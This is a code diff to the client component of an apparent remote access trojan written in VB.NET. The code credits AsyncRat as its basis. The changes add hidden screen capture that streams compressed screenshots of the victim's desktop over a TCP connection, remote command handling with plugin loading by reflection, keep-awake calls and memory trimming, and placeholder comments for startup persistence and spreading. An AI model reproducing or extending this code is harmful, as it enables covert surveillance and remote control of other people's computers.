@@ -10,6 +10,7 @@ Imports System.Drawing
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.Security.Principal
 Imports System.IO
+Imports System.Drawing.Drawing2D
 Imports System.Drawing.Imaging
 ''||       AUTHOR Arsium       ||
 ''||       github : https://github.com/arsium       ||
@@ -46,14 +47,24 @@ Public Class C
 
     Public Shared CLI As TcpClient
     Public Shared p As StringBuilder
-    Public Shared ViewerDesk As Thread
+
     ''
 
     Public Shared Sub Main()
 
+
+        SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED)
+
+
         ''ADD PERMISSION
         ''ADD STARTUP
         ''ADD SPREAD
+
+
+
+
+
+
 
 
         Try
@@ -95,13 +106,14 @@ Public Class C
 
     End Sub
 
+
     Public Shared Async Sub T(ByVal l As NetworkStream)
 
 
         p = New StringBuilder
 
         Try
-            Dim b(500 * 4096) As Byte
+            Dim b(150 * 4096) As Byte
 
 
             While True
@@ -132,19 +144,20 @@ Public Class C
 
                             p.Clear()
 
-
+                            '            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"
                             Dim j2 As String() = Microsoft.VisualBasic.Strings.Split(j, "|SP1|")
 
 
                             Dim az As New Thread(Sub() Launch(CLI, j2(0), j2(1)))
                             az.Start()
+                            '  Task.Run(Sub() Launch(CLI, j2(0), j2(1)))
 
 
 
                             GC.Collect()
                             GC.WaitForPendingFinalizers()
                             SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
-
+                            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
 
                         ElseIf p.ToString = "|CLOSETHISSHIT|" Then
 
@@ -164,17 +177,15 @@ Public Class C
 
                             p.Clear()
 
+                            TcpV = New TcpClient
+
+                            TcpV.Connect("127.0.0.1", 8081)
 
 
 
-                            Try
-                                ViewerDesk = New Thread(AddressOf CamCam)
+                            ViewerDesk = New Thread(AddressOf CamCam)
 
-                                ViewerDesk.Start()
-                            Catch ex As Exception
-
-                            End Try
-
+                            ViewerDesk.Start()
 
                         ElseIf p.ToString.EndsWith("|TRDV|") Then
 
@@ -182,17 +193,9 @@ Public Class C
 
                             Try
                                 ViewerDesk.Abort()
-
                             Catch ex As Exception
 
                             End Try
-
-
-                            Dim ks As String = "|STPDSK|"
-
-                            CLI.GetStream.Write(System.Text.Encoding.UTF8.GetBytes(ks), 0, System.Text.Encoding.UTF8.GetBytes(ks).Length)
-
-
                         End If
 
 
@@ -208,14 +211,16 @@ Public Class C
                 GC.Collect()
                 GC.WaitForPendingFinalizers()
                 SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+                EmptyWorkingSet(Process.GetCurrentProcess.Handle)
             End While
         Catch ex As Exception
             Exit Sub
         End Try
     End Sub
 
-
-
+    Public Shared TcpV As TcpClient
+    Public Shared ViewerDesk As Thread
+    Public Shared ns As NetworkStream
 
     <DllImport("user32.dll")>
     Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean
@@ -240,13 +245,14 @@ Public Class C
     Public Shared Function Desk() As Image
         Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
         Dim iamage As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
-
-
+        'Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
 
         Dim graphics As Graphics = Graphics.FromImage(iamage)
-        Dim upperLeftSource As New Point(0, 0)
-        Dim upperLeftDestination As New Point(0, 0)
-        graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, primaryMonitorSize)
+
+        graphics.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
+
+
+        graphics.CopyFromScreen(0, 0, 0, 0, primaryMonitorSize)
 
         ''this code is always the same to get "screenshot" but it doesn't include cursor so I made a way to get it !
 
@@ -262,6 +268,7 @@ Public Class C
         hj.cbSize = Marshal.SizeOf(hj)
         GetCursorInfo(hj)
 
+
         If hj.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
 
             '
@@ -269,37 +276,99 @@ Public Class C
         End If
 
 
-        Return iamage
+        graphics.Dispose()
+
+
+
+
+        ''Based On the vbnet version of AsyncRat (code below)
+
+
+        Dim o As Integer = (primaryMonitorSize.Width / 100) * 80
+        Dim o2 As Integer = (primaryMonitorSize.Height / 100) * 80
+
+
+
+
+        Dim Resize As New Bitmap(o, o2)
+
+        Dim g2 As Graphics = Graphics.FromImage(Resize)
+        g2.CompositingQuality = CompositingQuality.HighSpeed
+        g2.DrawImage(iamage, New Rectangle(0, 0, o, o2), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
+
+        Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 75)
+        Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
+        Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
+        encoderParameters.Param(0) = encoderParameter
+
+        Dim MS As New IO.MemoryStream
+        Resize.Save(MS, encoderInfo, encoderParameters)
+
+
+
+
+        Return Image.FromStream(MS)
+    End Function
+    ''Async Rat VBnet Function 
+    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
+        Try
+            Dim j As Integer
+            Dim encoders() As ImageCodecInfo
+            encoders = ImageCodecInfo.GetImageEncoders()
+
+            j = 0
+            While j < encoders.Length
+                If encoders(j).FormatID = format.Guid Then
+                    Return encoders(j)
+                End If
+                j += 1
+            End While
+            Return Nothing
+        Catch ex As Exception
+        End Try
     End Function
 
-
     Public Shared Sub CamCam()
+        Dim bf As New BinaryFormatter
         While True
 
-
-            Dim i As Image = Desk()
-            Dim MS As New IO.MemoryStream
-
-            i.Save(MS, ImageFormat.Gif)
+            ns = TcpV.GetStream
 
 
-            Dim p As String = "|DESK|" & "|SP|" & Encoding.Default.GetString(MS.ToArray)
-
-            Dim B As Byte() = Encoding.Default.GetBytes(p)
-
-            '  Task.Run(Sub() CLI.GetStream.WriteAsync(B, 0, B.Length))
-
-            CLI.GetStream.WriteAsync(B, 0, B.Length)
-            MS.Dispose()
+            bf.Serialize(ns, Desk)
 
 
-            '    GC.Collect()
-            ' GC.WaitForPendingFinalizers()
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
 
-            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
 
+            Thread.Sleep(1)
+
+            '
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
+            EmptyWorkingSet(Process.GetCurrentProcess.Handle)
         End While
     End Sub
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -315,7 +384,6 @@ Public Class C
 
 
 
-        '   
         Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
 
 
@@ -325,6 +393,7 @@ Public Class C
         GC.Collect()
         GC.WaitForPendingFinalizers()
         SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
     End Sub
 
     Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
@@ -332,4 +401,21 @@ Public Class C
     <DllImport("ntdll.dll")>
     Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
     End Function
+
+    <DllImport("psapi")>
+    Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean
+    End Function
+
+    <DllImport("kernel32.dll", SetLastError:=True)>
+    Public Shared Function SetThreadExecutionState(ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
+
+    End Function
+
+    Public Enum EXECUTION_STATE As UInteger
+
+        ES_CONTINUOUS = &H80000000UI
+        ES_DISPLAY_REQUIRED = &H2
+        ES_SYSTEM_REQUIRED = &H1
+
+    End Enum
 End Class
